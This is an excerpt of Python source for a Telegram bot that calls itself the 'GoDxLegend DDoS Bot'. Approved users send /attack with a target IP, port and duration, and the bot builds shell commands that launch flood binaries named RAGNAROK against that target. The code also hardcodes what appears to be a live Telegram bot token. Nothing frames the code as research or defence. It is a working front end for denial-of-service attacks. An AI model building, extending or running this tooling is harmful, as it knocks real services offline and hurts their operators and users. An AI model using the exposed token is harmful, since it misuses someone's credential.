...
# Bot Configuration
TELEGRAM_BOT_TOKEN = '7032036527:AAGrbfqoKaV4JokWxR_u4IfFYkHmFSoYwOw'
...
async def start(update: Update, context: CallbackContext):
    ...
    if not await is_user_allowed(user_id):
        await context.bot.send_message(chat_id=chat_id, text="*🚫 Unauthorised Access! 🚫\n\n❌ You are not authorised to use this bot! ❌*", parse_mode='Markdown')
        return

    message = (
        "*🔥 Welcome to the GoDxLegend DDoS Bot! 🔥*\n\n"
        "*Status: Approved ✅*\n"
        "*Use /attack <ip> <port> <duration>*\n"
        "*⚔️ Let the best war begin! 💥*\n\n"
        "*👑 Bot Owner: @GoDxLegendOpB*"
    )
...
async def attack(update: Update, context: CallbackContext):
    ...
    args = context.args
    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*🔥 Please provide the details for the attack in the following format:\n\n💥 Usage: /attack <host> <port> <time>*", parse_mode='Markdown')
        return
    ...
    if argument_type == 3:
        attack_command = f"./RAGNAROK3 {ip} {port} {duration}"
    elif argument_type == 4:
        attack_command = f"./RAGNAROK4 {ip} {port} {duration}"
    elif argument_type == 5:
        attack_command = f"./RAGNAROK {ip} {port} {duration} {byte_size}"
    ...
    # Send attack successfully executed details to the user
        await context.bot.send_message(chat_id=chat_id, text=( 
        f"*✅ Attack Successfully Executed ✅*"
    ), parse_mode='Markdown')
